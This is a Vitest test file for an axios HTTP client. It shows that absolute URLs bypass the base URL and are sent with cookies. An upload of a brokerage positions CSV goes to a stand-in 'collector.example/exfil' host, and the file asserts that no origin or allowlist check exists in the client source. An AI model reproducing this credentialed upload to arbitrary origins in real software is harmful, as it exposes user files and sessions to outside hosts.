import { readFileSync } from 'node:fs'
import { resolve } from 'node:path'
import { describe, it, expect, beforeEach, vi } from 'vitest'
import axios from 'axios'

const axiosMocks = vi.hoisted(() => {
  const handlers = {
    requestFulfilled: null,
    requestRejected: null,
    responseFulfilled: null,
    responseRejected: null
  }

  const instance = vi.fn()
  instance.interceptors = {
    request: {
      use: (fulfilled, rejected) => {
        handlers.requestFulfilled = fulfilled
        handlers.requestRejected = rejected
      }
    },
    response: {
      use: (fulfilled, rejected) => {
        handlers.responseFulfilled = fulfilled
        handlers.responseRejected = rejected
      }
    }
  }
  instance.defaults = {
    baseURL: '/api',
    headers: { common: {} },
    withCredentials: true
  }
  instance.post = vi.fn()
  instance.get = vi.fn()

  return { instance, handlers }
})

vi.mock('axios', () => ({
  default: {
    create: vi.fn(() => axiosMocks.instance)
  }
}))

vi.mock('@/stores/auth', () => ({
  useAuthStore: () => ({ logout: vi.fn() })
}))

import { uploadFile } from '@/api/client'

const clientSource = readFileSync(resolve(__dirname, '../../../src/api/client.js'), 'utf8')
const createCfg = axios.create.mock.calls[0][0]

describe('HTTP client — URL absoluta sai com cookie (allowAbsoluteUrls default)', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    axiosMocks.instance.post.mockResolvedValue({ data: { success: true } })
  })

  it('axios.create não desliga allowAbsoluteUrls — URL absoluta ignora baseURL', () => {
    expect(createCfg.withCredentials).toBe(true)
    expect(createCfg.allowAbsoluteUrls).toBeUndefined()
    expect(createCfg.baseURL).toBe(import.meta.env.VITE_API_BASE_URL || '/api')

    expect(clientSource).toMatch(/withCredentials:\s*true/)
    expect(clientSource).not.toMatch(/allowAbsoluteUrls/)
  })

  it('interceptor de request não reescreve URL absoluta nem tira withCredentials', () => {
    const absoluteUrl = 'https://collector.example/exfil'
    const config = axiosMocks.handlers.requestFulfilled({
      method: 'post',
      url: absoluteUrl,
      headers: {},
      withCredentials: true,
      data: { snapshot: 'carteira' }
    })

    expect(config.url).toBe(absoluteUrl)
    expect(config.withCredentials).toBe(true)
    expect(config.baseURL).toBeUndefined()
  })

  it('uploadFile POST em origem absoluta segue com o arquivo — cookie da instância permanece ligado', async () => {
    const uploadFn = clientSource.slice(
      clientSource.indexOf('export const uploadFile'),
      clientSource.indexOf('export default client')
    )

    expect(uploadFn).toMatch(/client\.post\(url,\s*formData/)
    expect(uploadFn).not.toMatch(/startsWith\(['"]\//)
    expect(uploadFn).not.toMatch(/new URL|allowlist|origin|hostname/)

    const file = new File(['PETR4,100'], 'posicoes.csv', { type: 'text/csv' })
    await uploadFile('https://collector.example/exfil', file)

    expect(axiosMocks.instance.post).toHaveBeenCalledTimes(1)
    const [url, body] = axiosMocks.instance.post.mock.calls[0]
    expect(url).toBe('https://collector.example/exfil')
    expect(body).toBeInstanceOf(FormData)
    expect(body.get('file').name).toBe('posicoes.csv')
    expect(axiosMocks.instance.defaults.withCredentials).toBe(true)
  })
})
